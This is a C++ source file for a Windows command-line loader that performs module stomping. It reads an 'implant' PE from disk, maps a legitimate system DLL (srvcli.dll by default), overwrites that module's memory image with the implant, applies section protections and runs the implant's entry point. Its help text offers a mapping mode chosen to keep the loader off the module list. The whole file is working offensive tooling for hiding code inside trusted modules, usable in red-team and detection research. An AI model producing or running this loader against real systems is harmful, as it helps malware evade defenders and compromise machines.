#include <Windows.h>
#include <iostream>

#include <peconv.h>

#include <cstdint>
#include "ntddk.h"
#include "map_dll_image.h"
#include "util.h"

#pragma warning(disable:4996)

int prepare_payload(LPCSTR payload_path, OUT BYTE*& raw_payload, OUT BYTE*& payload, OUT size_t& raw_size, OUT size_t& payload_size) {

	raw_payload = peconv::load_file(payload_path, raw_size);
	if (!raw_payload) {
		dbg << "[-] Cannot read payload file!\n";
		return 0;
	}

	payload = peconv::load_pe_module(raw_payload, raw_size, payload_size, false, false);
	if (!payload) {
		dbg << "[-] Failed to convert the implant to virtual format!\n";
		peconv::free_file(raw_payload);
		raw_payload = nullptr;
		return 0;
	}

	if (!peconv::load_imports(payload)) {
		dbg << "[-] Loading imports failed!\n";
		peconv::free_pe_buffer(payload);
		payload = nullptr;
		peconv::free_file(raw_payload);
		raw_payload = nullptr;
		return 0;
	}

	if (!is_compatibile(raw_payload)) {
		peconv::free_pe_buffer(payload);
		payload = nullptr;
		peconv::free_file(raw_payload);
		raw_payload = nullptr;
		return -1;
	}

	return 1;
}

bool set_sections_access(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	DWORD oldProtect = 0;
	if (!VirtualProtect((LPVOID)mapped, PAGE_SIZE, PAGE_READONLY, &oldProtect)) return false;

	bool is_ok = true;

	size_t count = peconv::get_sections_count(implant_dll, implant_size);
	for (size_t i = 0; i < count; i++) {
		IMAGE_SECTION_HEADER* next_sec = peconv::get_section_hdr(implant_dll, implant_size, i);
		if (!next_sec) break;
		DWORD sec_protect = translate_protect(next_sec->Characteristics);
		DWORD sec_offset = next_sec->VirtualAddress;
		DWORD sec_size = next_sec->Misc.VirtualSize;
		if (!VirtualProtect((LPVOID)((ULONG_PTR)mapped + sec_offset), sec_size, sec_protect, &oldProtect)) is_ok = false;
	}

	return is_ok;
}

bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{

	dbg << "[*] Overwriting the mapping\n";
	bool is_ok = false;
	DWORD oldProtect = 0;

	size_t prev_size = peconv::get_image_size((BYTE*)mapped);

	if (prev_size) {
		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READWRITE, &oldProtect)) return false;
		memset(mapped, 0, prev_size);
		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READONLY, &oldProtect)) return false;
	}

	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &oldProtect)) {
		dbg << "implant size: " << implant_size << "\n";
		dbg << "prev size: " << prev_size << "\n";
		if (implant_size > prev_size) {
			dbg << "[-] The implant is too big for the target!\n";
		}
		return false;
	}

	memcpy(mapped, implant_dll, implant_size);
	is_ok = true;

	if (!set_sections_access(mapped, implant_dll, implant_size)) {
		is_ok = false;
	}
	return is_ok;
}

int run_implant(PVOID mapped, BYTE* buffer)
{
	DWORD ep_rva = peconv::get_entry_point_rva(buffer);
	bool is_dll = peconv::is_module_dll(buffer);
	peconv::free_file(buffer); buffer = nullptr;

	ULONG_PTR implant_ep = (ULONG_PTR)mapped + ep_rva;

	dbg << "[*] Executing Implant's Entry Point: " << std::hex << implant_ep << "\n";
	if (is_dll) {
		dbg << "[*] Executing Implant as DLL" << "\n";
		BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))(implant_ep);
		return dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
	}

	dbg << "[*] Executing Implant as EXE" << "\n";
	BOOL(*exe_main)(void) = (BOOL(*)(void))(implant_ep);
	return exe_main();

}

PVOID undo_overloading(LPVOID mapped, char* target_dll)
{
	size_t payload_size = 0;
	BYTE* payload = peconv::load_pe_module(target_dll, payload_size, false, false);

	if (!payload) {
		return NULL;
	}
	if (!peconv::load_imports(payload)) {
		peconv::free_pe_buffer(payload);
		return NULL;
	}
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)) {
		return NULL;
	}
	if (!overwrite_mapping(mapped, payload, payload_size)) {
		return NULL;
	}
	peconv::free_pe_buffer(payload);
	return mapped;
}

int dll_hollower(const char* payload_path, bool isClassic, char* target_dll)
{

	BYTE* raw_payload;
	BYTE* payload;
	size_t raw_size;
	size_t payload_size;
	dbg << "[1] Reading payload PE from disk: " << payload_path << "\n";
	if (!prepare_payload(payload_path, raw_payload, payload, raw_size, payload_size))
		return -1;
	dbg << "[1] OK (" << std::dec << raw_size << " bytes on disk, image prepared)\n";

	dbg << "[2] Loading target DLL into this process: " << target_dll << "\n";
	PVOID mapped;
	if (isClassic) {
		dbg << "[2] Using LoadLibrary (same idea as the sample shellcode loader)\n";
		mapped = LoadLibraryA(target_dll);
	}
	else {
		dbg << "[2] Using NtCreateSection / NtMapViewOfSection (no LoadLibrary)\n";
		mapped = map_dll_image(target_dll);
	}

	if (!mapped) {
		peconv::free_pe_buffer(payload);
		peconv::free_file(raw_payload);
		return -1;
	}

	dbg << "[3] Relocating implant PE to the module base " << mapped << "\n";
	if (!peconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)) {
		dbg << "[-] Failed to relocate the implant!\n";
		peconv::free_pe_buffer(payload);
		peconv::free_file(raw_payload);
		return -1;
	}

	dbg << "[4] Stomping the loaded module image with implant (stronger than .text-only patch)\n";
	if (!overwrite_mapping(mapped, payload, payload_size)) {
		undo_overloading(mapped, target_dll);
		peconv::free_pe_buffer(payload);
		peconv::free_file(raw_payload);
		return -1;
	}

	peconv::free_pe_buffer(payload);

	dbg << "[5] Running implant entry point (DllMain / WinMain)\n";

	int ret = run_implant(mapped, raw_payload);
	dbg << "[*] Implant finished, ret: " << std::dec << ret << "\n";
	if (isClassic) {
		undo_overloading(mapped, target_dll);
	}

	return 0;
}

void printHelp() {
	dbg <<
		"PELoader - PE module stomping (full image relocate + overwrite, not raw .text shellcode)\n\n"
		"Usage:\n"
		"  PELoader.exe [options] <payload.exe> [target.dll]\n\n"
		"Flow (read -> load DLL -> stomp -> run):\n"
		"  [1] Read payload PE from disk\n"
		"  [2] Load target DLL (default: srvcli.dll)\n"
		"  [3] Relocate implant to that base\n"
		"  [4] Overwrite the whole module mapping (imports resolved, section protections applied)\n"
		"  [5] Call DllMain / entry; with LoadLibrary mode, restore original DLL after run\n\n"
		"Arguments:\n"
		"  payload.exe  Your implant PE file (plain, not encrypted).\n"
		"  target.dll   Optional. Default is srvcli.dll (standard DLL search order).\n\n"
		"Options:\n"
		"  -m, --map    Map the DLL with NtCreateSection/NtMapView instead of LoadLibrary.\n"
		"               (No automatic restore; use when you do not want the loader on the module list.)\n"
		"  -h, --help   Show this help.\n\n"
		"Examples:\n"
		"  PELoader.exe implant.dll\n"
		"  PELoader.exe implant.dll srvcli.dll\n"
		"  PELoader.exe -m implant.dll C:\\Windows\\System32\\wininet.dll\n"
		<< std::endl;
}

int main(int argc, char* argv[])
{
	bool use_map = false;
	const char* payload_path = nullptr;
	const char* user_target = nullptr;

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-m") || !strcmp(argv[i], "--map")) {
			use_map = true;
			continue;
		}
		if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help") || !strcmp(argv[i], "/?")) {
			printHelp();
			return 0;
		}
		if (argv[i][0] == '-') {
			dbg << "[-] Unknown option: " << argv[i] << "\n";
			printHelp();
			return 1;
		}
		if (!payload_path)
			payload_path = argv[i];
		else if (!user_target)
			user_target = argv[i];
		else {
			dbg << "[-] Too many arguments.\n";
			printHelp();
			return 1;
		}
	}

	if (!payload_path) {
		printHelp();
		return 0;
	}

	char target_dll[MAX_PATH * 2] = { 0 };
	if (user_target) {
		if (!ExpandEnvironmentStringsA(user_target, target_dll, MAX_PATH * 2)) {
			dbg << "[-] ExpandEnvironmentStringsA failed\n";
			return 1;
		}
	}
	else {
		strcpy_s(target_dll, "srvcli.dll");
	}

	bool isClassic = !use_map;
	if (isClassic)
		dbg << "Mode: LoadLibrary + stomp + restore (default)\n";
	else
		dbg << "Mode: NtMapView stomp (-m)\n";

	return dll_hollower(payload_path, isClassic, target_dll) == 0 ? 0 : 1;
}
